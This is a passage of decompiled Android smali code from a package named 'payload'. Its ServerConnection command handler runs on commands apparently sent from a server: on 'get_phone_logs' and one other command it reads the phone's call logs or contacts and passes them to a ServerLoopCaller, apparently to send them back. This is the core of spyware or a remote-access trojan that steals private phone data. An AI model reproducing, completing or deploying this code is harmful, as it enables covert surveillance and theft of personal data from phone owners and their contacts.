    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_7

    .line 215
    new-instance v7, Lcom/mycompany/payload/CommandRunnder;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    move-object v9, v0

    iget-object v9, v9, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    invoke-direct {v8, v9}, Lcom/mycompany/payload/CommandRunnder;-><init>(Landroid/content/Context;)V

    move-object v3, v7

    .line 216
    move-object v7, v3

    invoke-virtual {v7}, Lcom/mycompany/payload/CommandRunnder;->getContects()Ljava/lang/String;

    move-result-object v7

    move-object v4, v7

    .line 217
    new-instance v7, Lcom/mycompany/payload/ServerLoopCaller;

    move-object v8, v0

    iget-object v8, v8, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    const/4 v9, 0x0

    check-cast v9, Ljava/lang/String;

    const/4 v10, 0x0

    check-cast v10, Ljava/lang/String;

    const/4 v11, 0x0

    check-cast v11, Ljava/lang/String;

    move-object v12, v4

    invoke-direct/range {v7 .. v12}, Lcom/mycompany/payload/ServerLoopCaller;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 220
    :cond_7
    move-object v7, v1

    const-string v8, "get_phone_logs"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_8

    .line 221
    new-instance v7, Lcom/mycompany/payload/CommandRunnder;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    move-object v9, v0

    iget-object v9, v9, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    invoke-direct {v8, v9}, Lcom/mycompany/payload/CommandRunnder;-><init>(Landroid/content/Context;)V

    move-object v3, v7

    .line 222
    move-object v7, v3

    invoke-virtual {v7}, Lcom/mycompany/payload/CommandRunnder;->getCallLogs()Ljava/lang/String;

    move-result-object v7

    move-object v4, v7

    .line 223
    new-instance v7, Lcom/mycompany/payload/ServerLoopCaller;

    move-object v8, v0

    iget-object v8, v8, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    const/4 v9, 0x0

    check-cast v9, Ljava/lang/String;

    const/4 v10, 0x0

    check-cast v10, Ljava/lang/String;

    const/4 v11, 0x0

    check-cast v11, Ljava/lang/String;

    move-object v12, v4

    invoke-direct/range {v7 .. v12}, Lcom/mycompany/payload/ServerLoopCaller;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 229
    :cond_8
    new-instance v7, Lcom/mycompany/payload/ServerLoopCaller;

    move-object v8, v0

    iget-object v8, v8, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    const-string v9, "command not define"

    invoke-direct {v7, v8, v9}, Lcom/mycompany/payload/ServerLoopCaller;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_0
.end method
